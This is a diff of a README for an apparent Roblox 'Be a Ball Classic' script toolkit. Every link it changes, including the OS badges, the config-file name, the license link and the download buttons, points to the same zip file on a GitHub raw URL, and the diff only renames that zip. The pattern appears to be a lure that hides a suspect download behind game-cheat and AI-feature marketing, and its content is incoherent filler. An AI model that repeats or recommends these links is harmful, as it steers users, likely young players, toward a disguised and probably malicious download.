@@ -11,12 +11,12 @@ Experience universal compatibility, thanks to diligent cross-platform craftsmans
 
 | System        | Supported | Notes                      |
 | ------------- | :-------: | -------------------------- |
-| ![Windows](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)    | ✅ | Optimized for all versions |
-| ![macOS](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)     | ✅ | Seamless on M1 & Intel     |
-| ![Linux](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)        | ✅ | Tested across major distros|
-| ![iOS](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)             | ✅ | Touch-optimized            |
-| ![Android](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)   | ✅ | Battery-friendly           |
-| ![Roblox Studio](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip) | ✅ | Full native integration    |
+| ![Windows](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)    | ✅ | Optimized for all versions |
+| ![macOS](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)     | ✅ | Seamless on M1 & Intel     |
+| ![Linux](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)        | ✅ | Tested across major distros|
+| ![iOS](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)             | ✅ | Touch-optimized            |
+| ![Android](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)   | ✅ | Battery-friendly           |
+| ![Roblox Studio](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip) | ✅ | Full native integration    |
 
 ---
 
@@ -57,7 +57,7 @@ Curved inside the core of _Be a Ball Classic_ lives a seamless fusion with indus
 
 **Setup Instructions:**
 1. Acquire an API key for OpenAI or Claude.
-2. In the config folder, modify the `https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip` file.
+2. In the config folder, modify the `https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip` file.
 3. Activate smart responses by toggling the AI module in the script menu.
 
 _Automated wisdom — always one bounce ahead._
@@ -80,12 +80,12 @@ Type your question in chat or send an email—expect a rolling response in no ti
 
 ## 📥 Official Download & Quickstart
 
-[![Download](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)
+[![Download](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)
 
 **Direct Download:**  
 Click the badge above to retrieve the script packaged with documentation, examples, and AI modules. The download contains:
 
-- Master `https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip` script
+- Master `https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip` script
 - Config and localization files
 - Integration samples for OpenAI/Claude
 - Illustrated user manual (EN, ES, ZH)
@@ -127,7 +127,7 @@ Testing shows minimal overhead on frame rates, even in dynamic environments with
 ## 📜 MIT License (2025)
 
 Be a Ball Classic Roblox Script is released under the MIT License.  
-See the full license text here: [MIT License](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)
+See the full license text here: [MIT License](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)
 
 © 2025 Be a Ball Classic Contributors. All rights reserved.
 
@@ -136,7 +136,7 @@ See the full license text here: [MIT License](https://raw.githubusercontent.com/
 ## 📥 Download Zone (Again!)
 
 Ready to upgrade your Roblox world?  
-[![Download](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/be-a-ball-classic-roblox-toolkit-v3.1.zip)
+[![Download](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)](https://raw.githubusercontent.com/MR-NOBODY47/be-a-ball-classic-roblox-toolkit/branch/manipular/roblox-ball-a-toolkit-be-classic-1.9.zip)
 
 _Enjoy rolling!_
 
